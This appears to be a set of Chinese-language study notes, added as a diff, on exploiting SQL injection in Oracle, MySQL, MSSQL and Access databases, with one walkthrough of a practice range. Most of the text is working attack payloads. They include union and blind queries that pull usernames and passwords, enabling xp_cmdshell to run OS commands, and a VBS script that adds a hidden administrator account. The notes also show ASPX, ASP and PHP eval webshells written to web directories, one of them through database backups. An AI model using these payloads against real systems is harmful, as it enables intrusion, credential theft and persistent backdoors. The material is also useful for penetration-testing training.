+或：select listagg(NAME,';') WITHIN GROUP(ORDER BY NAME) from student2;
+
+使用：
+SELECT xmlagg(xmlparse(content table_name||',' wellformed) order by table_name).getclobval() as bieming2 FROM all_tables;	//即使字符串够长也可以
+如：
+select listagg(NAME,';') WITHIN GROUP(ORDER BY NAME) from student2;改为：
+select xmlagg(xmlparse(content NAME||',' wellformed) order by NAME).getclobval() as bieming1 from student2;
+
+故：对于复杂的sql句式，可以先写类似的简单句式，再替换。
+
+new_list.php?id=-2 union select listagg(USER_NAME,';') WITHIN GROUP(ORDER BY USER_NAME),listagg(USER_PWD,'|') WITHIN GROUP(ORDER BY USER_PWD) from "sns_users"-- -	
+
+new_list.php?id=1  and 'q'=substr((select table_name from all_tables where rownum=1 and table_name like '%user%'),1,1)-- -
+new_list.php?id=1  and 's'=substr((select table_name from all_tables where rownum=1 and table_name like '%user%'),1,1)-- -	//故发现该表以s开头。以此类推。
+
+-->获取列名：
+new_list.php?id=1  and 'U'=substr((select column_name from all_tab_columns where table_name='sns_users' and rownum=1),1,1)-- -	//获取第一个字段
+
+select column_name from all_tab_columns where table_name='sns_users' and rownum=1 and column_name <> 'USER_NAME'	//获取该表的下一个字段：发现为USER_PWD。以此法获取其他字段
+
+-->获取数据。
+select USER_NAME,USER_PWD from "sns_users"-- -
+
+oracle组合多个字段为一个字段显示：
+1. select NAME||MATH||AGE bm1 from student2;	//读取3个字段为一个字段，起别名bm1
+2. 使用concat()函数：该函数只能连接两个字段，但||却能多次使用。
+select CONCAT(NAME,AGE) bm2 from student2;
+
+低版本：
+select wm_concat(NAME) from student2;
+
+盲注获取数据：
+跑数据：
+new_list.php?id=1 and 'z'=substr((select listagg(USER_NAME,';') WITHIN GROUP(ORDER BY USER_NAME) from "sns_users"),1,1)-- -
+
+
+
+mysql延时判断：
+select host from user where 'q'='q' and if(1=6,sleep(3),6);	//若执行了sleep(3)，则返回0；若返回6，则相当于返回1.
+
+
+
+eg2：墨者学院-sql注入实战靶场：
+/show.php?id=MQo=	核心：多了一步base64encode.
+编码前：
+/show.php?id=1'	//有差异，判断很可能存在注入
+id=1 and 1=1-- -和id=1 and 1=2-- - 有差异；得到注入位置。也为数字型注入。
+-->确定数据库类型：
+php一般搭配mysql；mysql中+或-一般表示连接特殊的东西，尝试一下。
+
+show.php?id=1-BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds'))=0 LIMIT 1 --	//发现有延时，故很可能存在注入
+或 show.php?id=1-SLEEP(10)=0 LIMIT 1 --
+故确定数据库为mysql.
+-->确定证明类型(优先考虑联合查询注入)：
+大胆猜测查询语句原型：
+select title,text from allpaper where id=1;
+1.确定字段个数。
+show.php?id=1 order by 2-- -	//1
+show.php?id=1 order by 3-- -	//0
+故字段格式为2
+2.联合查询：核心：要先确定字段个数与输出位。
+show.php?id=-1 union select 86,36-- -	//回显成功
+3.查询关键信息：
+show.php?id=-1 union select 86,version()-- -	//查询数据库版本信息
+show.php?id=-1 union select 86,user()-- -	//查询当前用户
+或select 384,(select user());
+-->获取数据库名：
+id=-1 union select 86,(SELECT schema_name FROM information_schema.schemata limit 0,1)-- -
+id=-1 union select 86,(SELECT schema_name FROM information_schema.schemata limit 1,1)-- -
+
+发现test数据库。
+id=-1 union select 86,(SELECT database() limit 0,1)-- -	//显示当前数据库名：为test
+或拼接：
+id=-1 union select 86,(SELECT group_concat(schema_name) FROM information_schema.schemata)-- -	//显示所有数据库
+-->获取表：
+id=-1 union select 86,(SELECT group_concat(table_name) FROM information_schema.tables where table_schema="test" limit 0,1)-- -
+发现data表。
+-->获取指定表的字段：
+id=-1 union select 86,(SELECT group_concat(column_name) FROM information_schema.columns where table_name="data")-- -
+发现id,title,main,thekey字段。
+-->获取指定字段的值：
+id=-1 union select 86,(select concat_ws("#",id,title,main,thekey) from data limit 0,1)-- -
+继续limit 1,1等。
+或显示全部：
+select group_concat(concat_ws(" | ",id,title,main,thekey)) from data
+
+注：mysql最好都使用双引号。
+
+
+
+
+盲注拓展：
+1. z.php?id=1 and 6=(select length(user) from dual)-- -
+2. new_list.php?id=1 and 1=(SELECT CASE WHEN 'X'=(select substr(name,1,1) from V$DATABASE) THEN dbms_pipe.receive_message('z',6) ELSE 2 END FROM dual)-- -	//时间盲注
+注意：dbms_lock.sleep无法在子查询中使用，故用dbms_pipe.receive_message代替。
+如：oracle执行	begin dbms_lock.sleep(6); end;	//则延时6s
+
+dbms_pipe.receive_message('RDS', 10)		//为从RDS管道返回的数据等待10秒
+或：
+select dbms_pipe.receive_message('sbx6', 20),'zxasdwd' from dual;	
+其中dbms_pipe.receive_message('sbx6', 20)返回1
+如：
+news.php?id=-1 or 1= dbms_pipe.receive_message('sbx2', 10)-- -	//一般都会延时，再取返回值
+
+orale条件语句：
+SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;	//理解为CASE和END配对
+
+
+
+报错注入常用的测试用法：
+'  "  a  'a   "a   .10"    \    等。
+
+md5一般16位或32位。
+
+
+
+注：回显的坑位个数一般需要一致。
+
+默认搭配：
+php+mysql
+jsp+oracle
+asp+sql server
+
+
+
+站库分离主要是指，即使你拿下数据库，基本上也很难拿下web服务器。
+
+sqlserver2008安装和配置：
+正常安装-->设置sa用户和凭证：
+左边安全性->登录名->sa 属性，更改新密码。 状态->启用，允许。
+sqlserver右键->属性->安全性->选择SQLserver和windows身份验证模式，确认->
+重启sqlserver服务。最好使用sql server自带的配置管理器。
+
+选择sqlserver身份验证->sa和其凭证登录成功。
+
+sqlserver开启远程连接：
+sqlserver右键属性->连接->选上允许远程连接。
+sqlserver右键属性->方面->下拉框选择"服务器配置"->将RemoteAccessEnabled属性设为True.
+或许需要退出sa重新登录一下就行了。
+
+services.msc 确保sql server browser等服务启动。
+打开sql server配置管理器：
+sql server服务->确保sqlexpress和browser服务启动。
+sql server网络配置->协议->启用TCP/IP协议->其属性->配置ip和端口并启用。
+一般配置TCP端口为1433，再启动，应用、确认即可。  
+最好在后面的ipall那设置端口，则连接该端口即可。
+重启相关服务。
+
+navicat连接sqlserver数据库，且为特定端口，则：
+10.17.186.123,1436		如此填写即可，连接特定的1636端口。
+
+
+sqlserver远程连接端口默认为1433.
+
+mssql身份验证：
+1.windows身份验证 ：使用windows用户本地验证。
+2.sqlserver身份验证：使用mssql用户完成验证。
+
+sa：即最高权限用户。
+
+mssql系统数据库：
+Master数据库(常用)：用于记录用户或数据相关的系统级别的信息。
+	视图：sysdatabases视图(一张表)：存储所有数据库信息。每个数据库在表中占一行。
+select name from master.dbo.sysdatabases;	//查询所有数据库名
+
+
+
+Msdb数据库：记录着计划任务、事件处理、备份、异常等信息。
+Model数据库：为用户数据库提供样板，新的用户数据库都以此为基础。
+
+Tempdb数据库：保存临时对象的工作空间，重启后内容被清空。
+sysobjects：在数据库中创建的每个对象(约束、规则等)在表中占一行。
+只有在tempdb内，每个临时对象才在该表中占一行。
+select * from sysobjects where xtype=<type of interest>
+如：查看视图：
+select * from sysobjects where xtype='V'
+
+xtype='P'		//存储过程。
+xtype='X'		//扩展存储过程。
+xtype='U'		//用户表
+	
+
+mssql架构一般为dbo，相当于mssql数据库下层存储表、视图等的容器。
+
+调用顺序：
+数据库(mssql)-->架构(dbo)-->表。
+
+
+
+服务器角色与数据库角色：
+A.服务器角色(针对数据库服务器设置的、能设置角色和权限)：
+sysadmin：该角色可执行任何任务，登录名为sa
+select name from sys.sql_logins where sid =0x01	//查询sa登录名，故最好还是根据sid判断。
+
+判断服务器角色命令：select is_srvrolemember('sysadmin')  若返回1，则是。
+dbo用户角色有最高权限。
+
+serveradmin：能更改服务器配置和关闭服务器。
+securityadmin：该服务器角色能管理登录名和属性。
+public服务器角色：所有数据库都有它的成员，权限最低。
+
+B.数据库角色：
+针对某个特定数据库设定角色和权限：
+db_owner	//在数据库中执行任何操作
+db_datareader	//运行从任何表中读取数据
+db_datawriter	//运行写入数据到任何表
+
+判断数据库角色命令：select is_member('db_owner')
+
+C.内置登录名：
+本地用户账户、本地服务账户(local service相当于users组的权限)、本地系统账户为具有高特权的内置账户NT\SYSTEM).
+
+sqlserver本质是以服务的方式在win上运行的。
+service.msc找到sql server(sqlexpress)属性找到登录，若选的是本地系统账户，则sql server运行时就是系统权限。
+
+
+
+mssql注入语句：
+https://websec.ca/kb/sql_injection#MSSQL_Default_Databases
+注释符：
+/*
+--
+;%00	//高版本这个可能不太行。
+
+mysql和mssql支持堆叠查询，但oracle不支持。
+
+select db_name()	获取当前数据库名
+select db_name(2)  则获取第二个数据库名。
+SELECT name FROM master..sysdatabases;	查询所有数据库名
+
+SELECT @@SERVERNAME	获取mssql连接时使用的主机名
+若非站库分离，则连接时填写获得的主机名就行了。
+
+取第一条数据，截取一个字符：
+SELECT TOP 1 SUBSTRING(table_name, 2, 1)table_name FROM information_schema.tables
+
+
+判断数据库类型：
+and exists (select * from sysobjects) --
+and exists (select count(*) from sysobjects) --  //效率更高
+说明：若存在sysobjects表，则为mssql；若存在则返回真，查询结果与原结构相同，否则报错或不同。
+
+查询数据库名：
+SELECT name from master..sysdatabases;
+SELECT db_name(); -- for N = 0,1,2,... 如SELECT db_name(2);
+
+查询表名：
+select name from 数据库名.dbo.sysobjects where xtype='U'
+如：
+z.asp?id=2 union all select null,(select top 1 name from mpzhe_db_v2.db0.sysobjects where xtype='U'),null,null
+
+获取具体列名：
+select top 1 column_name(object_id('表名'),1) from sysobjects
+如：获取manage表中的字段。
+z.asp?id=-2 union all select null,(select top 1 col_name(object_id('manage'),1) from sysobjects),null,null
+注：union会去重；union all不会去重。
+最好使用null，因为其可以匹配任何数据类型。
+
+IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';	休眠5s
+
+
+mssql将多行合并一行输出：
+select 分隔符+字段 from 表名 [条件] for xml path('')
+eg1：
+select ','+hobby from rows_to_row where name='张三' for xml path('')
+eg2：
+select ','+hobby from rows_to_row for xml path('')	//常用，
+但好像不太行。
+
+
+windows的SID：标志用户、组和计算机账户的唯一号码。
+
+
+
+url编码为什么有时能绕过sql的过滤实现注入？
+因为url编码本就是将每个字符转为16进制，而数据库底层本就是以16进制读写存储的，故绕过判断等。
+
+
+union内部的每个select语句必须拥有相同数量的列，对应的列一般也需拥有相似的数据类型。
+
+Access数据库没有注释符，/**/   、 --   和   #   都没法用。
+Access数据库不支持错误显示注入，Access数据库不能执行系统命令
+
+常用函数：
+select len("string")        查询给定字符串的长度
+select asc("a")             查询给定字符串的ascii值
+top  n                      查询前n条记录
+select mid("string",2,1)    查询给定字符串从指定索引开始的长度
+
+
+Access数据库特有表是：msysobjects，故可用其来判断是否为Access数据库。
+所有表都在同一个数据库下，不需判断数据库名。
+
+判断表：只能使用枚举暴破猜解的方式来判断。
+如：
+and exists(select * from  admin)
+若存在，则正常查询；否则报语法错误。
+
+
+字段也只能通过枚举：
+若有admin表，判断该表字段数：
+and exists(select * from admin order by 10)
+枚举字段名：
+and exists(select name from admin)
+
+
+判断表的数据行数：
+and (select count(*) from information)>100
+
+猜具体数据：只能用top，没有limit
+猜测admin列的第一个数据的长度，如果大于5查询不出数据，大于4正常，说明admin列的第一个数据长度是5
+and (select top 1 len(admin)from admin)>5
+ 
+猜测admin列的第一行数据的第一个字符的ascii码值，如果大于97查询不出数据，大于96正常，说明admin列的第一行数据的第一个字符的ascii值是97
+and (select top 1 asc(mid(admin,1,1))from admin)>97 
+第一行数据的第二个字符
+and (select top 1 asc(mid(admin,2,1))from admin)>97 
+ 
+从第二行开始，查询数据就得用另外的语句了,因为这里的top只能显示查询前几条数据，所以我们得用联合查询，先查询前两条，然后倒序，然后在找出第一条，这就是第二条数据。
+查询第二行admin列的长度
+and (select top 1 len(admin)  from ( select top 2 * from information order by id)  order by id desc)>55
+下面是查询第2条数据的第3个字符
+and (select top 1 asc(mid(admin,3,1))  from ( select top 2 * from information order by id)  order by id desc)>55
+查询第三条数据的4个字符
+and (select top 1 asc(mid(admin,4,1))  from ( select top 3 * from information order by id)  order by id desc)>55
+
+
+mssql扩展存储过程，即多条mssql语句的组合、封装。类似函数。
+常用的扩展存储过程：
+xp_cmdshell：执行shell命令，任何输出都作为文本行返回。05版本后默认关闭。
+查询是否有xp_cmdshell：
+select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
+
+启用xp_cmdshell的方法：
+EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; 
+
+使用方法：
+exec master..xp_cmdshell 'whoami'
+等效于 exec master.dbo.xp_cmdshell 'whoami'
+
+
+
+xp_dirtree存储过程：
+显示该目录下的子目录：相当于dir
+exec master..xp_dirtree 'C:\\Users\\z\\Desktop',1,1	
+
+
+sp_OACreate存储过程：创建OLE对象的实例。缺点：无回显，需输出到一个文件进行查看。
+
+执行命令：
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami > C:\\Users\\Administrator\\Desktop\\z1.txt'	输出到文件
+
+xp_cmdshell被删除解决方法：
+exec master..xp_dropextendedproc xp_cmdshell,@dllname='xplog70.dll' declare @o int;
+
+
+
+通过创建vbs脚本方式执行命令：如创建用户，启动项执行vbs文件。
+一般将该vbs脚本放在启动项等位置，使其运行即可。
+---------------------1s---------------------
+declare @sp_passwordxieo int, @f int, @t int, @ret int
+exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out
+exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'C:\\Users\\Administrator\\Desktop\\z1wzkzpk.vbs', 1
+exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject("WSCRIPT.NETWORK")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'os="WinNT://"&wsnetwork.ComputerName'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&"/Administrators,group")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create("user","123$")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword "123"'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&"/123$",user)'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&"/123$"';
+-----------------------1e---------------------
+
+
+
+
+mssql个版本密码hash：
+mssql 2000：
+select name,password from master.dbo.sysxlogins
+mssql 2005:
+select name,password_hash from sys.sql_logins
+
+2008 R2:
+select name,password_hash from sys.sql_logins where name='sa'
+
+2012 R2:
+select name,password_hash from sys.sql_logins
+
+2016:
+select name,password_hash from sys.sql_logins
+拿到hash放到cmd5等网站解密即可。
+
+
+利用xp_cmdshell写shell：
+exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^>>C:\\Users\\Administrator\\WWW\\test1z.aspx'
+
+
+asp一句话木马：
+<%eval request("a")%>
+
+
+注：注意><符号的转义，网页编码和数据库编码一般是相同的，中文一般都需进行url编码。
+前提：有对应目录的读写权限，指定路径。 最好放在web路径下。
+其实..\\test2z.aspx也可以写。
+
+
+
+数据库差异备份(即备份自上一次完全备份后有变化的数据)获取shell：
+------------------2s-------------------------
+select DB_NAME();
+create database testq2;
+backup database testq2 to disk = 'C:\\Users\\Administrator\\Desktop\\q6\\u1.bak';
+use testq2;
+create table [dbo].[testq2] ([cmd] [image]);
+insert into testq2(cmd) values(0x3C3F70687020406576616C28245F504F53545B785D293B3F3E);
+backup database testq2 to disk='C:\\Users\\Administrator\\WWW\\testqw6z.php' WITH DIFFERENTIAL,FORMAT
+----------------------2e------------------------
+create table [dbo].[testq2] ([cmd] [image]);为创建表。
+mysql> select unhex('3C3F70687020406576616C28245F504F53545B785D293B3F3E');
+即能看到原文。
+mysql> select hex('<?php @eval($_POST[x]);?>');
+转换，最后在前面加上0x即可。
+
+
+
+
+
+
+前提：有目标目录的读写权限。
+
+日志差异备份getshell：不常用。
+利用数据库备份功能写shell。
+前提：有目标目录的读写权限。
+
+
+
